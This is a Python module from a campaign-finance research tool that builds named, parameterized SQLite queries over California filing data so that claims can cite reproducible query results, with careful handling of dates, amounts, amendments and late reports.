"""Verifiable citations to local datasets.

⌘F on a web page is the right verification for prose. It is the wrong one for a database: a
contribution total is not a string on a page, and forcing it to be one is what pushed
researchers onto third-party mirrors whose numbers we then had to trust.

So a claim can cite a *query* instead. The source records which named query, with which
parameters, and what it returned; verification re-runs it and compares. That is stronger than
a snippet — it is reproducible on demand, and a human can run the same one-liner the pipeline
ran rather than hunting for text.

Queries are **named and parameterized**, never free SQL from an agent: an agent that can
write arbitrary SQL can write a query that returns whatever its claim needs, which is the
same self-certification problem `verification` has elsewhere.
"""

from __future__ import annotations

import datetime
import functools
import itertools
import re
import shlex
import unicodedata
from collections import Counter
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, NamedTuple

# Half a CENT, absolute. A 0.5% relative tolerance let a round figure verify against a true
# total more than $2,000 away. Half a cent absorbs float summation noise (~1e-9) and fails any
# figure a whole cent off — where "within one cent" would not: 100.02 - 100.01 is 0.00999… in
# binary floats.
TOLERANCE = 0.005

# Filers do not reliably split a candidate's name: one committee put the full name in the
# LAST-name field with the first name blank, so a (last, first) filter returned $0.00 for the
# largest independent expenditure in a race. Match every spelling a filer might use, and keep
# it exact per spelling so a different person with the same surname stays out.
def name_match_sql(last_col: str, first_col: str, first: str) -> str:
    """SQL matching a candidate name across the spellings filers actually use.

    With a first name given, a bare surname match is deliberately EXCLUDED: a race can have
    two candidates sharing a surname, so it cannot be attributed to either. The case that
    matters, the whole name in the last-name field, is caught by the concatenation clauses
    instead.
    """
    full = f"""
     OR UPPER(TRIM({last_col})) = UPPER(TRIM(?))
     OR UPPER(TRIM(COALESCE({first_col},'') || ' ' || COALESCE({last_col},''))) = UPPER(TRIM(?))
     OR UPPER(TRIM(COALESCE({last_col},'') || ' ' || COALESCE({first_col},''))) = UPPER(TRIM(?))
    """
    if first:
        return f"""(
        (UPPER(TRIM({last_col})) = UPPER(TRIM(?)) AND UPPER(TRIM(COALESCE({first_col},'')))
             = UPPER(TRIM(?))){full})"""
    return f"""(UPPER(TRIM({last_col})) = UPPER(TRIM(?)){full})"""


def name_args(last: str, first: str) -> list[str]:
    """Args for `name_match_sql`, in the same order."""
    full = f"{first} {last}".strip()
    head = [last.strip(), first.strip()] if first else [last.strip()]
    return head + [full, full, full]


def iso_date_sql(col: str) -> str:
    """SQL turning the export's "M/D/YYYY 12:00:00 AM" date text into YYYY-MM-DD.

    Compared as text, 5/24/2026 sorts before 10/14/2014, so every date filter goes through
    this. A value with no slash (already ISO, or blank) passes through minus any time part,
    and NULL reads as blank.
    """
    d = f"TRIM(COALESCE({col}, ''))"
    day = f"SUBSTR({d}, 1, INSTR({d} || ' ', ' ') - 1)"   # "10/14/2025"
    rest = f"SUBSTR({day}, INSTR({day}, '/') + 1)"         # "14/2025"
    return (f"(CASE WHEN INSTR({day}, '/') = 0 THEN {day} ELSE"
            f" SUBSTR({rest}, INSTR({rest}, '/') + 1)"
            f" || '-' || SUBSTR('0' || SUBSTR({day}, 1, INSTR({day}, '/') - 1), -2)"
            f" || '-' || SUBSTR('0' || SUBSTR({rest}, 1, INSTR({rest}, '/') - 1), -2) END)")


def real_date_sql(iso_col: str) -> str:
    """SQL true when an `iso_date_sql()` value is a real calendar date.

    Not its shape: a day-first "14/10/2025" normalizes to "2025-14-10", which looks like a
    date and sorts like one, so a window would place it silently. SQLite's date() rolls an
    impossible day over ("2025-02-31" -> "2025-03-03") and returns NULL for no date at all, so
    only a real date comes back unchanged. `IS`, not `=`, so a blank reads false, not NULL.
    """
    return f"(date({iso_col}) IS {iso_col})"


def date_window_sql(iso_col: str, since: str, until: str) -> tuple[str, list[str]]:
    """SQL keeping an ISO date (`iso_date_sql()` output) inside [since, until], and its args.

    Each bound compares at its own precision: an ISO date sorts after its own prefix, and
    `until` is checked against the date cut to its length, so until="2025" runs through
    12/31/2025. ie_total once cut both bounds to YYYY-MM for a BETWEEN, which made
    until="2025" exclude all of 2025 and widened since="2026-05-24" to the whole of May.
    Refuses a bound that is not a real ISO date (`calaccess.check_date`).

    Returns ("", []) with no bounds. A date that is not a real one (`real_date_sql()`) is
    neither in nor out here: whether to keep it is the caller's call, and it must say which.
    """
    from . import calaccess

    since = calaccess.check_date(since, "since")
    until = calaccess.check_date(until, "until")
    if since and until and since[:len(until)] > until:
        # No date can satisfy it, so it would come back as a well-formed "no expenditures in
        # this window" -- a finding, made out of a typo.
        raise ValueError(f"since {since!r} is after until {until!r}")
    terms, args = [], []
    if since:
        terms.append(f"{iso_col} >= ?")
        args.append(since)
    if until:
        terms.append(f"SUBSTR({iso_col}, 1, LENGTH(?)) <= ?")
        args += [until, until]
    return " AND ".join(terms), args


def amount_sql(col: str) -> str:
    """SQL reading a filed AMOUNT as money: its value for a plain decimal, else NULL.

    A blank AMOUNT is money nobody stated, not $0: CAST made it 0.0 and COUNT(*) still counted
    it, so a total whose only row had one came back found, "$0.00, 1 expenditure(s)" -- the
    zero this module exists to refuse. Not just blanks: CAST reads "N/A" as 0.0 and "1,000" as
    1.0, figures nobody filed. So only a plain decimal is read as money; every query leaves a
    NULL out of its sum AND its count, and names how many it left out. A stated "0" is the
    filer's figure and counts.
    """
    a = f"TRIM(COALESCE({col}, ''))"
    unsigned = f"(CASE WHEN SUBSTR({a}, 1, 1) = '-' THEN SUBSTR({a}, 2) ELSE {a} END)"
    return (f"(CASE WHEN {unsigned} GLOB '*[0-9]*' AND {unsigned} NOT GLOB '*[^0-9.]*'"
            f" AND {unsigned} NOT GLOB '*.*.*' THEN CAST({a} AS REAL) END)")


# A single contribution is reported on BOTH Form 460 Schedule A and Form 496 Part 3 when it
# crosses the 24-hour threshold, as two genuinely different filings — so amendment dedup does
# not catch it, and a large donor's gift came out doubled. The filer links the pair
# explicitly: TRAN_IDs share a base after the form prefix (A-100001 / F496P3-100001).
# Collapse on that base plus contributor, amount and date, within one filer.
def tran_base_sql(col: str) -> str:
    """SQL for a TRAN_ID's base, after its form prefix: the key a gift's reports share."""
    return (f"CASE WHEN INSTR({col}, '-') > 0 THEN SUBSTR({col}, INSTR({col}, '-') + 1)"
            f" ELSE {col} END")


# AMT is the amount as money (`amount_sql()`), NULL where the filer stated none; AMOUNT is the
# text as filed. The group keys on AMT, not CAST(AMOUNT AS REAL): CAST reads "300,000" as
# 300.0, so a row filed that way collapsed into a $300 gift under the same base, MAX() over
# the text kept "300,000", and the stated $300 was lost with it. A dedup has to read a value
# the way the sum does.
# One grouping for every receipts figure and listing: DEDUPED_RECEIPTS fills {rows} with
# RCPT_LATEST, and left_out_gifts() adds the rows of a schedule a later amendment left out.
_RECEIPT_GIFTS = f"""
    SELECT MAX(x.AMOUNT) AS AMOUNT, x.AMT, x.CTRIB_NAML, x.CTRIB_NAMF, x.RCPT_DATE,
           -- The group's provenance. A collapsed row still has to name a filing a human can
           -- open, or the listing loses its exit to a citation and every figure taken from it
           -- becomes uncitable. The EARLIEST filing is the one the gift was first reported on.
           MIN(CAST(x.FILING_ID AS INTEGER)) AS FILING_ID,
           COUNT(DISTINCT x.FILING_ID) AS FILINGS,
           -- every filing the gift came from, so one whose latest amendment dropped it is found
           GROUP_CONCAT(DISTINCT x.FILING_ID) AS FILING_IDS,
           MAX(x.CTRIB_EMP) AS CTRIB_EMP, MAX(x.CTRIB_OCC) AS CTRIB_OCC,
           MAX(x.FORM_TYPE) AS FORM_TYPE{{columns}}
    FROM (SELECT r.*, {tran_base_sql("r.TRAN_ID")} AS tbase,
                 {amount_sql("r.AMOUNT")} AS AMT
          FROM {{rows}} r JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
          WHERE f.FILER_ID = ?{{extra}}) x
    GROUP BY x.tbase, vg_name_key(x.CTRIB_NAML), vg_name_key(x.CTRIB_NAMF),
             x.RCPT_DATE, x.AMT
"""
DEDUPED_RECEIPTS = _RECEIPT_GIFTS.replace("{rows}", "RCPT_LATEST").replace("{columns}", "")


def left_out_gifts(con, filer_id: str, *, extra: str) -> tuple[list, str]:
    """A filer's schedules a later amendment of their filing left out
    (`calaccess.unrestated_schedules()`), and its gifts as DEDUPED_RECEIPTS groups them under
    `extra`, over its RCPT_LATEST rows and those schedules' rows; ([], "") when it has none.
    The one route from a filer to what its figures leave out, so the figures and the listing
    agree about it.

    Grouped together, so a left-out row reporting a gift a counted row also reports (the same
    gift on a Form 496 and a Schedule A) joins that gift, which a figure counts either way.
    Adds OMITTED, 1 for a gift made only of left-out rows, which no figure counts, and GAPS,
    the indexes in the schedules of those it came from. The SQL takes the filer id twice,
    then `extra`'s arguments.
    """
    from . import calaccess

    schedules = calaccess.unrestated_schedules(con, "RCPT_CD", [r[0] for r in con.execute(
        "SELECT FILING_ID FROM FILER_FILING WHERE FILER_ID = ?", (filer_id,))])
    if not schedules:
        return [], ""
    staged = calaccess.stage_unrestated(con, "RCPT_CD", schedules)
    rows = ("(SELECT l.*, NULL AS gap FROM RCPT_LATEST l JOIN FILER_FILING g"
            " ON g.FILING_ID = l.FILING_ID WHERE g.FILER_ID = ?"
            f' UNION ALL SELECT * FROM temp."{staged}")')
    return schedules, (_RECEIPT_GIFTS.replace("{rows}", rows)
                       .replace("{columns}", ", MIN(x.gap IS NOT NULL) AS OMITTED,"
                                             " GROUP_CONCAT(DISTINCT x.gap) AS GAPS")
                       .format(extra=extra))


def _unread(n: int, whose: str = "") -> str:
    """The detail a receipt query appends for gifts it left out for want of an amount."""
    return f"; {n} more gift(s){whose} with no readable amount, not counted" if n else ""


def _no_rows(detail: str, suggestions: list[str] | None = None) -> "QueryResult":
    """No matching rows is NEVER a zero.

    `SUM()` over an empty set coalesces to 0.0, and a zero reads as a finding: "no committee
    has spent against this candidate" is a publishable sentence and was, briefly, wrong by
    the largest expenditure in a race. Every query returns this instead.
    """
    return QueryResult(value=None, rows=0, found=False, detail=detail,
                       suggestions=suggestions or [])


def _receipt_shares(con, inner: str, args: list, filing_ids: str | None) -> list:
    """The filings among a receipts figure's gifts whose latest amendment has no receipt rows
    (`calaccess.Unrestated`), with what each accounts for. `inner` is the figure's
    DEDUPED_RECEIPTS, run with the same `args`. Only the gifts the figure counts: one with no
    readable amount is left out of it (`amount_sql()`), so its filing has no share in it.

    `filing_ids` is every filing the figure's counted gifts came from (a GROUP_CONCAT of
    FILING_IDS), read in the pass that computed the figure: the usual figure counts no such
    filing, and then costs no second pass over its gifts.
    """
    from . import calaccess

    gaps = calaccess.unrestated_filings(
        con, "RCPT_CD", {f for f in (filing_ids or "").split(",") if f})
    if not gaps:
        return []
    return calaccess.unrestated_shares(con, "RCPT_CD", [
        ([f for f in (r["ids"] or "").split(",") if f], float(r["amt"]), int(r["n"]))
        for r in con.execute(f"""
            SELECT d.FILING_IDS ids, SUM(d.AMT) amt, COUNT(*) n
            FROM ({inner}) d WHERE d.AMT IS NOT NULL GROUP BY d.FILING_IDS""", args)], gaps)


def _left_out_receipts(con, filer_id: str, extra: str, extra_args: list) -> list:
    """The schedules a receipts figure leaves out because a later amendment of their filing
    has rows on other schedules and none on them (`calaccess.UnrestatedSchedule`), with what
    the figure leaves out from each. `extra` and `extra_args` are the figure's own filter, so
    only rows it would have counted are named.

    A gift a counted row also reports is not left out: it is in the figure either way. Nor is
    one with no readable amount (`amount_sql()`), which the figure would leave out anyway, as
    `_receipt_shares()` gives it no share. The usual filer has no such schedule, and costs a
    lookup of its filings and their amendments. Asked of a miss too: a name whose every
    readable gift was left out is not a name with no gifts.
    """
    from . import calaccess

    schedules, gifts = left_out_gifts(con, filer_id, extra=extra)
    if not schedules:
        return []
    return calaccess.unrestated_shares(con, "RCPT_CD", [
        ([int(g) for g in r["gaps"].split(",")], float(r["amt"]), int(r["n"]))
        for r in con.execute(f"""
            SELECT d.GAPS gaps, SUM(d.AMT) amt, COUNT(*) n
            FROM ({gifts}) d WHERE d.OMITTED AND d.AMT IS NOT NULL GROUP BY d.GAPS""",
                             [filer_id, filer_id] + list(extra_args))],
        dict(enumerate(schedules)))


@dataclass
class QueryResult:
    value: Any
    detail: str = ""
    rows: int = 0
    found: bool = True
    suggestions: list[str] | None = None
    # Set by `run()`, never by a query: which definition produced the value, and from which
    # export (see `Query.version` and `export_date()`).
    version: int = 0
    export_date: str = ""
    # Filings the value counts rows from although their latest amendment has none
    # (`calaccess.Unrestated`), with what each accounts for. A value with any is not verified.
    unrestated: list = field(default_factory=list)
    # Schedules a filing's later amendment has no rows on, whose earlier rows the value leaves
    # out (`calaccess.UnrestatedSchedule`), with what it leaves out. A value with any is not
    # verified either.
    omitted: list = field(default_factory=list)
    # Filings whose rows the value leaves out although their own amendment's cover matched
    # what it asks for, because the filing's latest cover names someone else or no one
    # (`calaccess.Reattributed`), with what each left out. A value with any is not verified.
    reattributed: list = field(default_factory=list)
    # Late reports the value leaves out although they could change it (`LateReport`): any with
    # an amount nobody stated first, then the most money either way. A value with any is not
    # verified.
    late: list = field(default_factory=list)
    # Other names that could be the same giver's, which a value for one name as filed leaves out
    # although they could change it (`_name_line`, or a ranking's `_contender_line`), largest
    # first. A value with any is not verified either.
    names: list = field(default_factory=list)

    @property
    def note(self) -> str:
        n = self.detail
        if not self.found and self.omitted:
            # Not "no match": what matches is on schedules no figure counts (`unsettled`). "With
            # a readable amount": a counted match without one is a miss either way (`_unread`).
            n += (" — every match with a readable amount is on a schedule a later amendment "
                  "left out")
            if self.suggestions:
                # Still shown: another schedule that does count the gift is a different figure,
                # and the claim decides whether it is the one to cite.
                n += ". Not counted here: " + "; ".join(self.suggestions[:4])
        elif not self.found and self.reattributed:
            # Not "no match" either: ie_total's matches are in filings whose latest cover names
            # someone else, as the detail says, and `unsettled` names each one. A near name is
            # still shown: another candidate, or this one filed another way.
            if self.suggestions:
                n += " — similar names: " + "; ".join(self.suggestions[:4])
        elif not self.found and self.suggestions:
            n += " — NO MATCH. Did you mean: " + "; ".join(self.suggestions[:4])
        elif not self.found:
            n += " — NO MATCH for that name"
        return n

    @property
    def unsettled(self) -> str:
        """Why this value cannot verify as it stands, or "". Five reasons, each with what a person
        opens, since a note alone would still render green:

        - `unrestated`: a filing's latest amendment can carry a cover and no rows in a table,
          and the rows the value counts are then an earlier amendment's. That amendment either
          withdrew them or did not restate that schedule, and the export cannot say which.
        - `omitted`: the same one level down, the other way round. A later amendment has rows
          on some schedules and none on another, and the value leaves out the earlier rows on
          that one.
        - `reattributed`: the other side of the first. Rows the value leaves out because the
          filing's latest cover names someone else, although their own amendment's cover
          matched what the value asks for. The later amendment moved them, or dropped the
          candidate in an update that restated nothing.
        - `late`: a figure for a schedule asked for by name (form_type=A, or "" for every
          schedule) is that schedule's as filed, and a late-reported gift no 460 restates yet
          is not in it: "gave $3,000" reads as the whole story a week after a $4,000 late gift.
          Only the claim's wording settles whether it holds: as a schedule-A figure as filed,
          it stands; as the whole total or the largest giver, it may not.
        - `names`: a value for one name as filed (names=as_filed) leaves out other names that
          could be the same giver's, and they could change it. Each is listed as filed, with its
          figure and where its gifts came from.

        The first two say "rows a later amendment may have withdrawn", which the research skill
        matches to leave the row for a person rather than retry it; the third says LEFT_OUT,
        which it matches too. Each names its UNSETTLED_SHOWN or LATE_SHOWN largest (`_listed`):
        this becomes a claim file's reason, and a committee's whole history can name dozens.
        `vg query` prints the rest.
        """
        why = []
        if self.unrestated:
            each = _listed(self.unrestated, share_text, UNSETTLED_SHOWN,
                           "filing(s) with smaller shares")
            why.append(f"counts rows a later amendment may have withdrawn, and the export cannot "
                       f"say whether it did. {each}. If a latest amendment removed its rows, this "
                       f"value is wrong; if it only left that schedule unchanged, the value "
                       f"stands.")
        if self.omitted:
            each = _listed(self.omitted, share_text, UNSETTLED_SHOWN,
                           "schedule(s) with smaller shares")
            why.append(f"leaves out rows a later amendment may have withdrawn, and the export "
                       f"cannot say whether it did. {each}. If that amendment withdrew them, "
                       f"leaving them out is right; if it only left that schedule unchanged, "
                       f"they belong in this figure.")
        if self.reattributed:
            each = _listed(self.reattributed, left_out_text, UNSETTLED_SHOWN,
                           "filing(s) with smaller amounts")
            why.append(f"{LEFT_OUT}: the filing's latest cover, which decides whose money a row "
                       f"is, names another candidate, the other stance or none, and the export "
                       f"cannot say which cover is right. {each}. If the earlier cover is right, "
                       f"this value is short by those rows; if the latest one is, the value "
                       f"stands.")
        if self.late:
            each = _listed(self.late, late_text, LATE_SHOWN, "late report(s)")
            why.append("leaves out late-reported contributions that no Form 460 schedule A "
                       f"restates yet, and they could change it. {each}. Worded as this "
                       "schedule's figure or ranking as filed, the value stands; worded as the "
                       "whole total, or as who gave the most, it may not: check whether these "
                       "gifts change it.")
        if self.names:
            each = _listed(self.names, str, LATE_SHOWN, "name(s)")
            why.append("is for names exactly as filed, and other names that could be the same "
                       f"giver's could change it: {each}. Worded as this name's figure or the "
                       "ranking of names as filed, the value stands; worded as the giver's whole "
                       "total, or as who gave the most, it may not: check whether these are the "
                       "same giver.")
        return "it " + " It also ".join(why) if why else ""

UNSETTLED_SHOWN = 5


def _listed(items: list, line, shown: int, more: str) -> str:
    """The first `shown` of `items`, each as `line` gives it, for `QueryResult.unsettled`, and
    how many `more` there are. The one copy of the count: each reason used to keep its own."""
    each = "; ".join(line(u) for u in items[:shown])
    # > 0, not truthiness: with fewer items than shown the difference is negative, and truthy,
    # and every short reason ended "and -4 more filing(s)"
    if (rest := len(items) - shown) > 0:
        each += f"; and {rest} more {more}, which `vg query` lists"
    return each


def share_text(u) -> str:
    """One unrestated filing's or schedule's line in `QueryResult.unsettled`: what it is, what
    the result rests on from it or leaves out, and where to open it. "Rests on", not "adds up
    to": for top_contributor the rows are anyone's gifts in the ranking, not the named
    contributor's total."""
    return (f"{u.describe()}: ${u.amount:,.2f} in {u.rows} row(s) this result {u.does} "
            f"(open {u.cite_url})")


# What `vg verify` and `vg build` write for a value with `reattributed` filings, and what the
# research skill matches to tell such a row from one to retry.
LEFT_OUT = "leaves out rows that a filing's own amendment attributed to this candidate"


def left_out_text(u) -> str:
    """One reattributed filing's line in `QueryResult.unsettled`, and in a miss's detail."""
    return (f"{u.describe()}: ${u.amount:,.2f} in {u.rows} row(s) this total leaves out "
            f"(open {u.cite_url})")


# How many late reports, and other names, `QueryResult.unsettled` names. Display only.
LATE_SHOWN = 5


@dataclass
class LateReport:
    """One late report's entries that a figure leaves out (`QueryResult.late`)."""
    filing_id: int
    amend_id: str           # the amendment the entries come from (the *_LATEST views)
    forms: frozenset[str]   # this filing's forms: F497P1, or F496P3
    also: frozenset[int]    # other filings reporting one of these gifts under its TRAN_ID base
    amount: float           # the entries' stated amounts, summed
    gross: float            # the same, each taken as positive: a gift and its correction net to 0
    entries: int
    unread: int             # entries with no amount a reader could add up

    @property
    def cite_url(self) -> str:
        from . import calaccess

        return calaccess.filing_url(self.filing_id)


def late_text(r: LateReport) -> str:
    """One late report's line in `QueryResult.unsettled`: which filing, what it holds that the
    value leaves out, and where to open it. Display only."""
    form = " and ".join({"F497P1": "Form 497", "F496P3": "Form 496 Part 3"}.get(f, f)
                        for f in sorted(r.forms))
    held = f"${r.amount:,.2f} in {r.entries} entr{'y' if r.entries == 1 else 'ies'}"
    if r.gross > abs(r.amount) + TOLERANCE:
        held += f", ${r.gross:,.2f} before netting"
    if r.unread:
        held += f", {r.unread} with no readable amount"
    where = f"filing {r.filing_id}" + (f" amendment {r.amend_id}"
                                       if r.amend_id not in ("", "0") else "")
    if r.also:
        form += f"; also on filing {', '.join(map(str, sorted(r.also)))}"
    return f"{where} ({form}): {held} (open {r.cite_url})"


def _schedule(form_type: str) -> tuple[str, list[str], str]:
    """The receipt-schedule filter every contribution query applies (a condition on `r`), its
    args, and the label for the detail (`_schedule_label`).

    One helper for all three, not a copy in each: filer_total kept an unguarded copy after the
    other two were fixed. It ran form_type=" " (truthy) as a filter for the receipts with no
    schedule and returned their sum as found, labelled "schedule- ", which reproduced green.
    """
    if form_type != form_type.strip():
        raise ValueError(f"form_type must be a schedule code, or '' for every schedule, "
                         f"not {form_type!r}")
    label = _schedule_label(form_type)
    if not form_type:
        return "", [], label
    return " AND UPPER(TRIM(r.FORM_TYPE)) = UPPER(TRIM(?))", [form_type], label


def _schedule_label(form_type: str) -> str:
    """How a detail names the schedules counted: `schedule-<CODE>`, or `every-schedule` for "".

    The code is upper-cased as the filter matches it and as a miss names the other schedules,
    so "f401a" reads schedule-F401A, not a schedule of its own. ASCII letters only, as SQLite's
    UPPER() does: Python upper-cases "ß" to "SS", which would name a schedule nothing matched.
    Display only, so it is not part of a query's definition fingerprint.
    """
    if not form_type:
        return "every-schedule"
    return "schedule-" + "".join(c.upper() if c.isascii() else c for c in form_type)


def _other_schedules(con: Any, filer_id: str, form_type: str, who: str = "",
                     who_args: list[Any] | None = None) -> list[str]:
    """The receipt schedules besides `form_type` that hold this filer's receipts (narrowed by
    `who`, a condition on `r`), for a miss to suggest. Empty when `form_type` is "", which
    already counted every schedule.

    Suggestions only: nothing here reaches a value, which is why the definition fingerprint
    leaves it out. Read from the raw schedules, not DEDUPED_RECEIPTS, whose collapsed
    cross-form group carries only one of its schedules (A-100001 and F496P3-100001 read as
    F496P3). A blank schedule is left out: no form_type selects it alone, and "form_type="
    would count every schedule.
    """
    if not form_type:
        return []
    return [r[0] for r in con.execute(f"""
        SELECT DISTINCT UPPER(TRIM(r.FORM_TYPE)) FROM RCPT_LATEST r
        JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
        WHERE f.FILER_ID = ?{who}
          AND UPPER(TRIM(COALESCE(r.FORM_TYPE, ''))) NOT IN ('', UPPER(TRIM(?)))
        ORDER BY 1
    """, [str(filer_id), *(who_args or []), form_type])]


def _elsewhere(con: Any, filer_id: str, form_type: str, who: str = "",
               who_args: list[Any] | None = None) -> tuple[str, list[str]]:
    """For a miss on `form_type`: the note naming the other schedules this filer's receipts are
    on (`_other_schedules`), and the one suggestion to count them. ("", []) when there are none.

    A slate mailer's receipts are all on Form 401, and "no schedule-A contributions" alone read
    as a committee that received nothing. One suggestion for every schedule, not one each: the
    note shows four, and a hint per schedule pushed out the near-name the researcher needed.
    Display only, like `_other_schedules`.
    """
    others = _other_schedules(con, filer_id, form_type, who, who_args)
    if not others:
        return "", []
    return (f"; receipts on schedule {', '.join(others)} not counted",
            ["form_type=" + ", form_type=".join(others)])


# Late reports. A contribution received in the weeks before an election is reported within 24
# hours on a late report: Form 497 Part 1 (S497_CD), or Form 496 Part 3 (F496P3 rows in RCPT_CD)
# for a committee making independent expenditures. Each is restated later on the schedule A of
# the Form 460 whose period covers the gift. Until that 460 is filed the gift is on the late
# report alone, and a schedule-A total leaves it out: in the weeks a voter guide is written, the
# largest gift could be missing from `top_contributor` and every total, and the citation would
# still reproduce green.
#
# Late entries are never added to a total, only held against one: the contribution queries
# refuse by default when one could change their answer (`_late_reports`), and a schedule asked
# for by name answers but goes to a person, naming each late report (`QueryResult.unsettled`).
# Counting them would rest on keys nobody has checked against a real export: whether a Form 497
# entry shares its TRAN_ID base with its schedule-A copy, and whether a gift reported on both
# late forms can be told apart from two gifts. A key that fails there double-counts silently;
# here it only refuses.
#
# An entry counts as restated, and is not pending, when:
# - a schedule-A row carries the same transaction: TRAN_ID base, name, date and amount, all four
#   equal (the cross-form key DEDUPED_RECEIPTS collapses on); or
# - a Form 460 the filer has filed covers its dates, since that 460 had to restate it.
# Everything uncertain leaves it pending, or widens what it could change: a date or amount that
# cannot be read, and a name that could be a contributor's (`_could_be`).
def _pending_late(con: Any, filer_id: str) -> list[dict[str, Any]]:
    """The late-report entries for a filer that no schedule A restates yet (see above). The
    caller checks first that Form 497 can be read (calaccess.late_reports_loaded).

    One per transaction as the cross-form key tells them apart, so an entry restated in an
    amendment counts once (the *_LATEST views) and one on both late forms under one TRAN_ID base
    counts once. One on both under different bases counts twice, which only makes a refusal
    likelier.
    """
    tables = {r[0] for r in con.execute("SELECT name FROM main.sqlite_master WHERE type = 'table'")}
    parts = [f"""
        SELECT r.FILING_ID AS filing_id, {tran_base_sql("r.TRAN_ID")} AS tbase,
               r.CTRIB_NAML AS naml, r.CTRIB_NAMF AS namf, r.AMOUNT AS amount,
               {amount_sql("r.AMOUNT")} AS amt, UPPER(TRIM(r.FORM_TYPE)) AS form,
               {iso_date_sql("r.RCPT_DATE")} AS d, '' AS until, r.AMEND_ID AS amend
        FROM RCPT_LATEST r JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
        WHERE f.FILER_ID = ? AND UPPER(TRIM(r.FORM_TYPE)) = 'F496P3'"""]
    args: list[Any] = [str(filer_id)]
    if "S497_CD" in tables:
        # DATE_THRU ends an entry covering a range of dates. Not every export need carry it,
        # and without it an entry is its CTRIB_DATE.
        s497_cols = {r[1] for r in con.execute('PRAGMA main.table_info("S497_CD")')}
        until = iso_date_sql("s.DATE_THRU") if "DATE_THRU" in s497_cols else "''"
        parts.append(f"""
        SELECT s.FILING_ID, {tran_base_sql("s.TRAN_ID")}, s.ENTY_NAML, s.ENTY_NAMF, s.AMOUNT,
               {amount_sql("s.AMOUNT")}, UPPER(TRIM(s.FORM_TYPE)), {iso_date_sql("s.CTRIB_DATE")},
               {until}, s.AMEND_ID
        FROM S497_LATEST s JOIN FILER_FILING f ON f.FILING_ID = s.FILING_ID
        WHERE f.FILER_ID = ? AND UPPER(TRIM(s.FORM_TYPE)) = 'F497P1'""")
        args.append(str(filer_id))
    rows = [dict(r) for r in con.execute(" UNION ALL ".join(parts), args)]
    if not rows:
        return []

    # Schedule-A rows that could be one of these transactions: only under their TRAN_ID bases.
    restated = set()
    bases = sorted({str(r["tbase"]) for r in rows})
    for i in range(0, len(bases), 500):
        chunk = bases[i:i + 500]
        restated |= {_transaction(a) for a in con.execute(f"""
            SELECT * FROM (
                SELECT {tran_base_sql("r.TRAN_ID")} AS tbase, r.CTRIB_NAML AS naml,
                       r.CTRIB_NAMF AS namf, r.AMOUNT AS amount,
                       {amount_sql("r.AMOUNT")} AS amt, {iso_date_sql("r.RCPT_DATE")} AS d
                FROM RCPT_LATEST r JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
                WHERE f.FILER_ID = ? AND UPPER(TRIM(r.FORM_TYPE)) = 'A')
            WHERE tbase IN ({", ".join("?" * len(chunk))})
        """, [str(filer_id), *chunk])}

    entries: dict[tuple[Any, ...], dict[str, Any]] = {}
    for r in rows:
        key = _transaction(r)
        if key in restated:
            continue
        e = entries.setdefault(key, {**r, "forms": set(), "copies": {},
                                     "filing_id": int(r["filing_id"])})
        e["forms"].add(r["form"])
        # One gift filed under one key in two spellings ("Quennell"/"Ada" and "QUENNELL"/"ADA",
        # on two filings) is shown under the least of them, as the ranking's MIN() does: the
        # first row read is load order, and a refusal named the giver one way or the other.
        spelled = (str(r["naml"] or ""), str(r["namf"] or ""))
        if spelled < (str(e["naml"] or ""), str(e["namf"] or "")):
            e["naml"], e["namf"] = spelled
        # which filing and amendment says it, for the reviewer to open
        e["copies"][int(r["filing_id"])] = (r["form"], str(r["amend"] or "0").strip())
        e["filing_id"] = min(e["filing_id"], int(r["filing_id"]))
        e["until"] = max(e["until"] or "", r["until"] or "")
    # The filer's Form 460 periods. A period that cannot be read covers nothing.
    periods = []
    cover_cols = ({r[1] for r in con.execute(
        'PRAGMA main.table_info("CVR_CAMPAIGN_DISCLOSURE_CD")')}
        if "CVR_CAMPAIGN_DISCLOSURE_CD" in tables else set())
    if {"FILING_ID", "FORM_TYPE", "FROM_DATE", "THRU_DATE"} <= cover_cols:
        periods = con.execute(f"""
            SELECT pf, pt FROM (
                SELECT {iso_date_sql("c.FROM_DATE")} AS pf, {iso_date_sql("c.THRU_DATE")} AS pt
                FROM CVR_LATEST c JOIN FILER_FILING f ON f.FILING_ID = c.FILING_ID
                WHERE f.FILER_ID = ? AND UPPER(TRIM(c.FORM_TYPE)) = 'F460')
            WHERE {real_date_sql("pf")} AND {real_date_sql("pt")}
        """, [str(filer_id)]).fetchall()

    def covered(e: dict[str, Any]) -> bool:
        # One 460 has to cover the whole entry, CTRIB_DATE through DATE_THRU.
        start, end = e["d"], e["until"] or e["d"]
        return (_real_day(start) and _real_day(end)
                and any(pf <= start <= pt and pf <= end <= pt for pf, pt in periods))

    return sorted((e for e in entries.values() if not covered(e)), key=_late_order)


def _transaction(r: Any) -> tuple[Any, ...]:
    """The cross-form key of a receipt row: TRAN_ID base, name, date and amount, the amount as
    `amount_sql()` reads it (`amt`), as the dedup and every sum do. A blank or unreadable amount
    keys as its text, so it never pairs with a stated 0 ("1,000" is not 1)."""
    amount = r["amt"]
    return (str(r["tbase"]), _name_key(r["naml"]), _name_key(r["namf"]), r["d"],
            amount if amount is not None else f"text:{str(r['amount'] or '').strip()}")


def _real_day(iso: Any) -> bool:
    """Whether an `iso_date_sql()` value is a real calendar day, as `real_date_sql()` asks."""
    from . import calaccess

    try:
        return bool(calaccess.ISO_DAY.fullmatch(iso or "")) and bool(
            datetime.date.fromisoformat(iso))
    except ValueError:
        return False


_WORD = re.compile(r"[^\W_]+")
# A name's tokens, as whitespace, commas and semicolons separate them: "QUILLON, R" is two.
_TOKEN = re.compile(r"[^\s,;]+")
# A token that is initials: one letter, or letters each followed by a point ("R", "R.", "R.M.").
_INITIALS = re.compile(r"(?:[^\W\d_]\.)*[^\W\d_]\.?")


# Letters NFKD leaves whole, spelled as an English-language filer would type them. The export
# is latin-1, so Ø, Æ, Ð and Þ do occur.
_UNFOLDED = str.maketrans({"Ø": "O", "Æ": "AE", "Œ": "OE", "Ð": "D", "Đ": "D", "Þ": "TH",
                           "Ł": "L"})


def _fold(text: Any) -> str:
    """Text upper-cased with its accents dropped (NFKD, combining marks removed, and the letters
    that have no decomposition spelled out), so 'Élise' and 'ELISE' read alike and 'E' is an
    initial of both, as 'O' is of 'Øystein'. Unfolded, an initial missed its word and two names
    that could be one giver's read as two, which fails toward green."""
